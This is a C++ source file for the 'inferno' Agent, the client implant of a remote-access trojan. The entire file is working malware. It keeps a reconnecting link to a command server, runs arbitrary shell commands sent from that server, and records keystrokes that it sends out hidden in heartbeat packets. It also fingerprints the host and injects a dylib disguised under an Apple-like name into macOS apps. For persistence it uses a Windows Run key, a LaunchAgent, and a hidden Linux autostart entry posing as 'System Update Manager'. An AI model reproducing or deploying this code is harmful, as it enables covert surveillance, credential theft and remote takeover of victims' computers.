#include "../include/Agent.hpp"
#include "../include/entry_dylib.hpp"
#include "../include/EntitlementScanner.hpp"
#include "../include/MachInjector.hpp"
#include <iostream>
#include <cstdio>
#include <cstdlib>
#include <chrono>
#include <thread>
#include <random>
#include <sstream>
#include <algorithm>
#include <ctime>
#include <fstream>
#include <cmath>

#ifdef _WIN32
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <lmcons.h>
#else
#include <unistd.h>
#include <sys/utsname.h>
#include <sys/stat.h>
#include <pwd.h>
#endif

#ifdef __APPLE__
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>
#include <mach-o/dyld.h>
#endif

namespace inferno {

static std::string getAgentDylibPath() {
#ifdef __APPLE__
    const char* home = ::getenv("HOME");
    return home ? (std::string(home) + "/.cache/com.apple.amp.itmstransporter.dylib")
                : "/tmp/.inferno_agent.dylib";
#else
    return {};
#endif
}

Agent::Agent() : m_server_ip("127.0.0.1"), m_server_port(4242), m_state(AgentState::INIT), m_running(false), m_persistence_installed(false), m_reconnect_delay(MIN_BACKOFF) {}

Agent::Agent(const std::string& server_ip, uint16_t server_port)
    : m_server_ip(server_ip), m_server_port(server_port), m_state(AgentState::INIT), m_running(false), m_persistence_installed(false), m_reconnect_delay(MIN_BACKOFF) {}

Agent::~Agent() {
    stop();
}

void Agent::run() {
    m_running = true;
    while (m_running) {
        if (inferno::agent::isDylibShuttingDown()) {
            m_running = false;
            break;
        }
        switch (m_state) {
            case AgentState::INIT:
                handleInit();
                break;
            case AgentState::CONNECTING:
                handleConnecting();
                break;
            case AgentState::CONNECTED:
                handleConnected();
                break;
            case AgentState::LISTENING:
                handleListening();
                break;
            case AgentState::DISPATCHING:
                // Handled internally in handleListening
                break;
            case AgentState::ERROR_STATE:
                std::cerr << "[Agent] Terminal Error State reached. Restarting INIT.\n";
                m_state = AgentState::INIT;
                break;
        }
    }
}

void Agent::stop() {
    m_running = false;
    // Socket will be closed by destructor or on reconnection
}

void Agent::handleInit() {
    std::cout << "[Agent] Initializing...\n";
    // Future: Setup persistence, hide console, etc.
    m_state = AgentState::CONNECTING;
}

void Agent::handleConnecting() {
    std::cout << "[Agent] Attempting to connect to " << m_server_ip << ":" << m_server_port << "..." << std::endl;
    if (m_socket.connectTo(m_server_ip, m_server_port)) {
        std::cout << "[Agent] Connection established." << std::endl;
        m_reconnect_delay = MIN_BACKOFF;
        m_state = AgentState::CONNECTED;
    } else {
        // Exponential backoff with jitter
        thread_local std::mt19937 rng(std::random_device{}());
        unsigned delay = m_reconnect_delay;
        // Apply ±30% jitter
        std::uniform_int_distribution<int> jitter_dist(
            static_cast<int>(-static_cast<int>(delay * 0.3)),
            static_cast<int>(delay * 0.3));
        delay = static_cast<unsigned>(std::max(1, static_cast<int>(delay) + jitter_dist(rng)));

        std::cerr << "[Agent] Connection failed. Retrying in " << delay << " seconds..." << std::endl;
        for (unsigned i = 0; i < delay; ++i) {
            if (!m_running || inferno::agent::isDylibShuttingDown()) {
                return;
            }
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }

        // Double backoff for next attempt, cap at MAX_BACKOFF
        m_reconnect_delay = std::min(m_reconnect_delay * 2, MAX_BACKOFF);
    }
}

void Agent::handleConnected() {
    // Transition to LISTENING. The Server will request info via SYS_REQ_INFO.
    m_state = AgentState::LISTENING;
}

void Agent::handleListening() {
    std::vector<uint8_t> buffer;
    ssize_t bytes = m_socket.receiveData(buffer, 4096);

    if (bytes <= 0) {
        std::cerr << "[Agent] Connection lost.\n";
        m_socket.close();
        m_state = AgentState::CONNECTING;
        return;
    }

    // Accumulate in member buffer (handles TCP fragmentation)
    m_receive_buffer.insert(m_receive_buffer.end(), buffer.begin(), buffer.end());

    // Sliding buffer loop: process ALL complete packets in the buffer
    while (true) {
        // Guard: need at least a full header to inspect
        if (m_receive_buffer.size() < sizeof(PacketHeader)) break;

        // Resync: peek at magic before calling deserialize().
        // deserialize() returns nullopt for BOTH "incomplete data" and "invalid magic/checksum".
        // Without this check, a single corrupted prefix byte causes an infinite stall.
        const uint32_t magic =
            (static_cast<uint32_t>(m_receive_buffer[0]) << 24) |
            (static_cast<uint32_t>(m_receive_buffer[1]) << 16) |
            (static_cast<uint32_t>(m_receive_buffer[2]) << 8)  |
             static_cast<uint32_t>(m_receive_buffer[3]);

        if (magic != 0xDEADBEEF) {
            std::cerr << "[Agent] Buffer desync detected — discarding 1 byte to resync.\n";
            m_receive_buffer.erase(m_receive_buffer.begin());
            continue;
        }

        auto packet_opt = ::inferno::Packet::deserialize(m_receive_buffer);
        if (!packet_opt.has_value()) {
            break; // Incomplete packet — wait for more data
        }
        const size_t packet_size = sizeof(PacketHeader) + packet_opt->getWirePayloadSize();
        handleDispatching(std::move(*packet_opt));
        // Slide: remove the consumed packet bytes from the front of the buffer
        m_receive_buffer.erase(m_receive_buffer.begin(),
                               m_receive_buffer.begin() + packet_size);
    }
}

void Agent::handleDispatching(Packet&& packet) {
    uint16_t opcode = packet.getOpcode();
    std::cout << "[Agent] Dispatching Opcode: " << opcode << std::endl;

    if (opcode == static_cast<uint16_t>(Opcode::SYS_REQ_INFO)) {
        std::string info = getSystemInfo();
        Packet res(static_cast<uint16_t>(Opcode::SYS_RES_INFO), info);
        std::vector<uint8_t> data = res.serialize();
        m_socket.sendData(data);

        // Tier 2: scan for injectable apps and report all targets to server
        std::string scan_report = "none||0|0";
        try {
            auto targets = inferno::tier2::scanApplications();
            if (!targets.empty()) {
                // Determine current host process to mark which target is already injected
                std::string host_path;
#ifdef __APPLE__
                uint32_t bufsize = 0;
                _NSGetExecutablePath(nullptr, &bufsize);
                std::vector<char> exec_buf(bufsize);
                if (_NSGetExecutablePath(exec_buf.data(), &bufsize) == 0) {
                    host_path = std::string(exec_buf.data());
                }
#endif
                std::vector<std::string> records;
                for (const auto& t : targets) {
                    bool is_host = !host_path.empty() && t.executable_path == host_path;
                    records.push_back(t.path + "|" + t.bundle_id + "|"
                                    + std::to_string(static_cast<int>(t.capability)) + "|"
                                    + (is_host ? "1" : "0"));
                }
                scan_report.clear();
                for (size_t i = 0; i < records.size(); ++i) {
                    if (i > 0) scan_report += "\n";
                    scan_report += records[i];
                }
            }
        } catch (const std::exception& e) {
            std::cerr << "[Agent] Scanner failed: " << e.what() << std::endl;
            scan_report = "none||0|0";
        } catch (...) {
            std::cerr << "[Agent] Scanner failed with unknown error" << std::endl;
            scan_report = "none||0|0";
        }
        Packet scan_res(static_cast<uint16_t>(Opcode::SCAN_RESULT), scan_report);
        data = scan_res.serialize();
        m_socket.sendData(data);

        // Persist for reboot survival (only once per session)
        if (!m_persistence_installed) {
            persistInjectedAgent(m_server_ip, m_server_port);
            m_persistence_installed = true;
        }
    } else if (opcode == static_cast<uint16_t>(Opcode::PROC_LIST_REQ)) {
        handleProcessDiscovery();
    } else if (opcode == static_cast<uint16_t>(Opcode::CMD_EXEC)) {
        handleShellExecution(std::move(packet));
    } else if (opcode == static_cast<uint16_t>(Opcode::PING)) {
        // Piggyback keylog data on PONG: prefer jittered data from shared buffer,
        // fall back to immediate dump for any remaining keystrokes
        std::string pong_payload;
        {
            std::lock_guard<std::mutex> lock(m_keylog_pending_mutex);
            if (!m_keylog_pending_data.empty()) {
                pong_payload = std::move(m_keylog_pending_data);
                m_keylog_pending_data.clear();
            }
        }
        Packet pong(static_cast<uint16_t>(Opcode::PONG), pong_payload);
        std::vector<uint8_t> data = pong.serialize();
        m_socket.sendData(data);
    } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_START)) {
        handleKeylogStart();
    } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_STOP)) {
        handleKeylogStop();
    } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_DUMP)) {
        handleKeylogDump();
    } else if (opcode == static_cast<uint16_t>(Opcode::PROPAGATE)) {
        handlePropagation(std::move(packet));
    } else if (opcode == static_cast<uint16_t>(Opcode::INJECT)) {
        handleInjection(std::move(packet));
    }
}

void Agent::handleKeylogStart() {
    if (m_keylog_jitter_thread.joinable()) {
        std::cerr << "[Agent] Jitter thread already running — ignoring double start.\n";
        return;
    }
    std::cout << "[Agent] Starting KeyLogger...\n";
    m_keylogger.start();

    m_keylog_jitter_running = true;
    m_keylog_dump_requested = false;
    m_keylog_jitter_thread = std::thread([this]() {
        std::mt19937 rng(std::random_device{}());
        std::uniform_int_distribution<int> jitter_dist(500, 3000);

        while (m_keylog_jitter_running) {
            std::unique_lock<std::mutex> lock(m_keylog_jitter_mutex);
            if (!m_keylog_jitter_cv.wait_for(lock, std::chrono::milliseconds(200),
                [this]() { return m_keylog_dump_requested.load() || !m_keylog_jitter_running; })) {
                continue;
            }
            if (!m_keylog_jitter_running) break;

            m_keylog_dump_requested = false;
            lock.unlock();

            std::this_thread::sleep_for(std::chrono::milliseconds(jitter_dist(rng)));

            std::string keystrokes = m_keylogger.dump();
            if (keystrokes.empty()) continue;

            // Append to shared buffer for PONG piggybacking — accumulates
            // across multiple KEYLOG_DUMP polls until the next PONG sends it.
            {
                std::lock_guard<std::mutex> pending_lock(m_keylog_pending_mutex);
                if (m_keylog_pending_data.size() + keystrokes.size() <= KeyLogger::MAX_BUFFER_SIZE) {
                    m_keylog_pending_data += keystrokes;
                }
            }
        }
    });
}

void Agent::handleKeylogStop() {
    std::cout << "[Agent] Stopping KeyLogger...\n";
    m_keylogger.stop();

    m_keylog_jitter_running = false;
    m_keylog_jitter_cv.notify_one();
    if (m_keylog_jitter_thread.joinable()) {
        m_keylog_jitter_thread.join();
    }
}

void Agent::handleKeylogDump() {
    std::cout << "[Agent] Keylogger dump requested (jitter scheduled)...\n";
    m_keylog_dump_requested = true;
    m_keylog_jitter_cv.notify_one();
}

void Agent::handlePropagation(Packet&& packet) {
    const auto& raw = packet.getPayload();
    if (raw.empty()) return;

    uint8_t cmd_byte = raw[0];
    std::string target(raw.begin() + 1, raw.end());

    Propagator::Command cmd = static_cast<Propagator::Command>(cmd_byte);
    Propagator::Result result = m_propagator.execute(cmd, target);

    // Build result payload: 1 byte success + output string
    std::vector<uint8_t> payload;
    payload.push_back(result.success ? 1 : 0);
    size_t output_size = std::min(result.output.size(), static_cast<size_t>(UINT16_MAX));
    uint16_t out_len = static_cast<uint16_t>(output_size);
    payload.push_back(static_cast<uint8_t>((out_len >> 8) & 0xFF));
    payload.push_back(static_cast<uint8_t>(out_len & 0xFF));
    payload.insert(payload.end(), result.output.begin(), result.output.begin() + output_size);

    Packet res(static_cast<uint16_t>(Opcode::PROPAGATE_RES),
               std::string(payload.begin(), payload.end()));
    m_socket.sendData(res.serialize());
}

void Agent::handleInjection(Packet&& packet) {
    const auto& raw = packet.getPayload();
    if (raw.empty()) {
        Packet res(static_cast<uint16_t>(Opcode::INJECT_RES), "empty|empty|0|0");
        m_socket.sendData(res.serialize());
        return;
    }

    std::string target_path(raw.begin(), raw.end());
    std::cout << "[Agent] Injection requested into: " << target_path << std::endl;

    // Build TargetApp on the fly — capability defaults to DYLD_INSERT_LIBRARIES
    inferno::tier2::TargetApp target;
    target.executable_path = target_path;
    target.path = target_path;
    target.capability = inferno::tier2::InjectionCapability::DYLD_INSERT_LIBRARIES;

    std::string dylib_path = getAgentDylibPath();

    bool success = inferno::tier2::injectIntoTarget(target, dylib_path,
                                                     m_server_ip, m_server_port);

    std::string result = target_path + "||"
                       + std::to_string(static_cast<int>(target.capability)) + "|"
                       + (success ? "1" : "0");

    Packet res(static_cast<uint16_t>(Opcode::INJECT_RES), result);
    m_socket.sendData(res.serialize());
}

void Agent::handleShellExecution(Packet&& packet) {
    // 1. Deserialize the command from the payload
    const auto& raw = packet.getPayload();
    if (raw.size() < 2) {
        std::cerr << "[Agent] CMD_EXEC: payload too short." << std::endl;
        return;
    }
    const uint16_t cmd_len = (static_cast<uint16_t>(raw[0]) << 8) | raw[1];
    if (raw.size() < static_cast<size_t>(2 + cmd_len)) {
        std::cerr << "[Agent] CMD_EXEC: payload truncated." << std::endl;
        return;
    }
    const std::string command(raw.begin() + 2, raw.begin() + 2 + cmd_len);
    std::cout << "[Agent] Executing: " << command << std::endl;

    // 2. Execute via ShellExecutor
    const ShellExecutor::Result result = m_shell.execute(command);

    // 3. Transmit output in 4096-byte chunks (stealth page-size chunking)
    const std::string& output = result.output;
    const size_t chunk_size   = ShellExecutor::CHUNK_SIZE;
    const size_t total        = output.size();
    size_t offset             = 0;

    auto send_chunk = [&](uint8_t status, const std::string& data) {
        std::vector<uint8_t> payload;
        payload.push_back(status);
        // Append data length (2 bytes, big-endian)
        const uint16_t len = static_cast<uint16_t>(data.size());
        payload.push_back(static_cast<uint8_t>((len >> 8) & 0xFF));
        payload.push_back(static_cast<uint8_t>(len & 0xFF));
        payload.insert(payload.end(), data.begin(), data.end());

        Packet res(static_cast<uint16_t>(Opcode::CMD_RES),
                   std::string(payload.begin(), payload.end()));
        m_socket.sendData(res.serialize());
    };

    if (total == 0) {
        // Send empty end-of-output immediately
        send_chunk(1, "");
        return;
    }

    thread_local std::mt19937 jitter_rng(std::random_device{}());
    std::uniform_int_distribution<int> jitter_dist(50, 250);

    do {
        const size_t end   = std::min(offset + chunk_size, total);
        const bool is_last = (end == total);
        const uint8_t status = is_last ? 1 : 0;
        send_chunk(status, output.substr(offset, end - offset));
        offset = end;
        if (!is_last) {
            std::this_thread::sleep_for(
                std::chrono::milliseconds(jitter_dist(jitter_rng)));
        }
    } while (offset < total);
}

void Agent::handleProcessDiscovery() {
    const auto& list = m_profiler.getSnapshot();
    
    // Chunking parameters
    const size_t entries_per_page = 50;
    size_t total_pages = (list.size() + entries_per_page - 1) / entries_per_page;

    // Helper: Platfrom-independent Big-Endian serialization
    auto append_u16 = [](std::vector<uint8_t>& out, uint16_t value) {
        out.push_back(static_cast<uint8_t>((value >> 8) & 0xFF));
        out.push_back(static_cast<uint8_t>(value & 0xFF));
    };
    auto append_u32 = [](std::vector<uint8_t>& out, uint32_t value) {
        out.push_back(static_cast<uint8_t>((value >> 24) & 0xFF));
        out.push_back(static_cast<uint8_t>((value >> 16) & 0xFF));
        out.push_back(static_cast<uint8_t>((value >> 8) & 0xFF));
        out.push_back(static_cast<uint8_t>(value & 0xFF));
    };

    for (size_t p = 0; p < total_pages; p++) {
        std::vector<uint8_t> payload;
        
        // 1. Header of the page
        uint8_t is_last = (p == total_pages - 1) ? 1 : 0;
        size_t start = p * entries_per_page;
        size_t end = std::min(start + entries_per_page, list.size());
        uint16_t entries_in_page = static_cast<uint16_t>(end - start);

        // Serialization
        append_u16(payload, static_cast<uint16_t>(p)); // Page Index
        payload.push_back(is_last);
        append_u16(payload, entries_in_page);

        // 2. Add entries
        for (size_t i = start; i < end; i++) {
            uint16_t name_len = static_cast<uint16_t>(list[i].name.length());

            append_u32(payload, list[i].pid);
            append_u16(payload, name_len);

            // Name
            payload.insert(payload.end(), list[i].name.begin(), list[i].name.end());
        }

        Packet res(static_cast<uint16_t>(Opcode::PROC_LIST_RES), 
                  std::string(payload.begin(), payload.end()));
        
        m_socket.sendData(res.serialize());
    }
}

std::string resolveBinaryPath(const std::string& argv0) {
    if (argv0.empty()) return {};
#ifdef _WIN32
    char abs_path[MAX_PATH];
    if (GetFullPathNameA(argv0.c_str(), MAX_PATH, abs_path, nullptr)) {
        return std::string(abs_path);
    }
    return argv0;
#else
    char* resolved = ::realpath(argv0.c_str(), nullptr);
    if (resolved) {
        std::string result(resolved);
        ::free(resolved);
        return result;
    }
    return argv0;
#endif
}

void Agent::installPersistence(const std::string& binary_path,
                                const std::string& server_ip,
                                uint16_t server_port) {
    if (binary_path.empty()) return;

    std::string abs_path = resolveBinaryPath(binary_path);
    if (abs_path.empty()) return;

    std::string port_str = std::to_string(server_port);

#ifdef _WIN32
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        std::string cmd = "\"" + abs_path + "\" " + server_ip + " " + port_str;
        RegSetValueExA(hKey, "InfernoAgent", 0, REG_SZ,
                       reinterpret_cast<const BYTE*>(cmd.c_str()),
                       static_cast<DWORD>(cmd.size() + 1));
        RegCloseKey(hKey);
    }
#elif defined(__APPLE__)
    const char* home = ::getenv("HOME");
    if (!home) return;

    std::string plist_dir = std::string(home) + "/Library/LaunchAgents";
    std::string plist_path = plist_dir + "/com.inferno.agent.plist";

    // Create directory
    ::mkdir(plist_dir.c_str(), 0755);

    // Write plist XML — use restrictive umask so file is not world-writable
    // launchd rejects world-writable plists with EIO error.
    mode_t old_mask = ::umask(022);
    FILE* f = ::fopen(plist_path.c_str(), "w");
    ::umask(old_mask);
    if (!f) return;
    std::fprintf(f, R"(<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.inferno.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
        <string>%s</string>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
)", abs_path.c_str(), server_ip.c_str(), port_str.c_str());
    ::fclose(f);

    // NOTE: No launchctl bootstrap/load needed — macOS automatically scans
    // ~/Library/LaunchAgents/ at login and loads all plists found there.
    // The agent is already running for the current session.
#else
    // Linux: autostart .desktop file
    const char* home = ::getenv("HOME");
    if (!home) return;

    std::string autostart_dir = std::string(home) + "/.config/autostart";
    std::string desktop_path = autostart_dir + "/inferno-agent.desktop";

    ::mkdir(autostart_dir.c_str(), 0755);

    FILE* f = ::fopen(desktop_path.c_str(), "w");
    if (!f) return;
    std::fprintf(f, R"([Desktop Entry]
Type=Application
Name=System Update Manager
Exec=%s %s %s
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
)", abs_path.c_str(), server_ip.c_str(), port_str.c_str());
    ::fclose(f);
#endif
}

#ifdef __APPLE__
void Agent::persistInjectedAgent(const std::string& server_ip,
                                  uint16_t server_port) {
    // Get the host executable path
    uint32_t bufsize = 0;
    _NSGetExecutablePath(nullptr, &bufsize);
    std::vector<char> exec_buf(bufsize);
    if (_NSGetExecutablePath(exec_buf.data(), &bufsize) != 0) return;
    std::string exec_path(exec_buf.data());

    // If we're in the shim, fall back to standard persistence
    if (exec_path.find("inferno_shim") != std::string::npos) {
        installPersistence(exec_path, server_ip, server_port);
        return;
    }

    // We're inside a real app — the executable path is the target for launchd
    // Use the executable directly (not /usr/bin/open -a) because modern macOS
    // strips DYLD_INSERT_LIBRARIES when launched via LaunchServices.

    const char* home = ::getenv("HOME");
    if (!home) return;

    std::string plist_dir = std::string(home) + "/Library/LaunchAgents";
    std::string plist_path = plist_dir + "/com.inferno.agent.plist";
    std::string dylib_path = getAgentDylibPath();

    ::mkdir(plist_dir.c_str(), 0755);

    mode_t old_mask = ::umask(022);
    FILE* f = ::fopen(plist_path.c_str(), "w");
    ::umask(old_mask);
    if (!f) return;

    std::string port_str = std::to_string(server_port);
    std::fprintf(f, R"(<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.inferno.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>EnvironmentVariables</key>
    <dict>
        <key>DYLD_INSERT_LIBRARIES</key>
        <string>%s</string>
        <key>INFERNO_SERVER_IP</key>
        <string>%s</string>
        <key>INFERNO_SERVER_PORT</key>
        <string>%s</string>
    </dict>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <false/>
</dict>
</plist>
)", exec_path.c_str(), dylib_path.c_str(),
   server_ip.c_str(), port_str.c_str());
    ::fclose(f);
}
#else
void Agent::persistInjectedAgent(const std::string&, uint16_t) {}
#endif

std::string Agent::getHardwareUUID() {
#ifdef _WIN32
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char value[256] = {0};
        DWORD value_length = sizeof(value);
        if (RegQueryValueExA(hKey, "MachineGuid", NULL, NULL, reinterpret_cast<LPBYTE>(value), &value_length) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return "WIN-" + std::string(value);
        }
        RegCloseKey(hKey);
    }
    return "Unknown-Windows-UUID";
#elif defined(__APPLE__)
    io_registry_entry_t matching = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOPlatformExpertDevice"));
    if (!matching) return "Unknown-Mac";
    
    CFStringRef serial = (CFStringRef)IORegistryEntryCreateCFProperty(matching, CFSTR(kIOPlatformSerialNumberKey), kCFAllocatorDefault, 0);
    IOObjectRelease(matching);
    
    if (!serial) return "Unknown-Mac-Serial";
    
    char buffer[256];
    if (CFStringGetCString(serial, buffer, sizeof(buffer), kCFStringEncodingUTF8)) {
        CFRelease(serial);
        // Simple hash-like representation (In production, use SHA-256)
        return "MAC-" + std::string(buffer);
    }
    CFRelease(serial);
    return "Unknown-Mac-ID";
#elif defined(__linux__)
    std::ifstream mid("/etc/machine-id");
    if (!mid.is_open()) mid.open("/var/lib/dbus/machine-id");
    
    if (mid.is_open()) {
        std::string id;
        mid >> id;
        return "LINUX-" + id;
    }
    return "Unknown-Linux";
#else
    return "Unknown-OS";
#endif
}

std::string Agent::getSystemInfo() {
    std::stringstream ss;
    ss << "ID: " << getHardwareUUID() << " | ";
    ss << "Host: " << getHostname() << " | ";
    ss << "User: " << getUsername() << " | ";
    ss << "OS: " << getOSVersion();
    return ss.str();
}

std::string Agent::getHostname() {
#ifdef _WIN32
    char buffer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(buffer);
    if (GetComputerNameA(buffer, &size)) {
        return std::string(buffer);
    }
    return "Unknown-Windows-Host";
#else
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        return std::string(hostname);
    }
    return "Unknown";
#endif
}

std::string Agent::getUsername() {
#ifdef _WIN32
    char buffer[UNLEN + 1];
    DWORD size = sizeof(buffer);
    if (GetUserNameA(buffer, &size)) {
        return std::string(buffer);
    }
    return "Unknown-Windows-User";
#else
    char username[256];
    if (getlogin_r(username, sizeof(username)) == 0) {
        return std::string(username);
    }
    // Fallback
    struct passwd* pw = getpwuid(getuid());
    if (pw) {
        return std::string(pw->pw_name);
    }
    return "Unknown";
#endif
}

std::string Agent::getOSVersion() {
#ifdef _WIN32
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char prodName[256] = {0};
        char displayVersion[256] = {0};
        DWORD prodNameLen = sizeof(prodName);
        DWORD displayVersionLen = sizeof(displayVersion);
        
        RegQueryValueExA(hKey, "ProductName", NULL, NULL, reinterpret_cast<LPBYTE>(prodName), &prodNameLen);
        RegQueryValueExA(hKey, "DisplayVersion", NULL, NULL, reinterpret_cast<LPBYTE>(displayVersion), &displayVersionLen);
        RegCloseKey(hKey);
        
        std::stringstream ss;
        ss << "Windows " << (prodName[0] ? prodName : "OS");
        if (displayVersion[0]) {
            ss << " (" << displayVersion << ")";
        }
        return ss.str();
    }
    return "Windows OS";
#else
    struct utsname buffer;
    if (uname(&buffer) == 0) {
        std::stringstream ss;
        ss << buffer.sysname << " " << buffer.release << " (" << buffer.machine << ")";
        return ss.str();
    }
    return "Linux/Generic";
#endif
}

} // namespace inferno
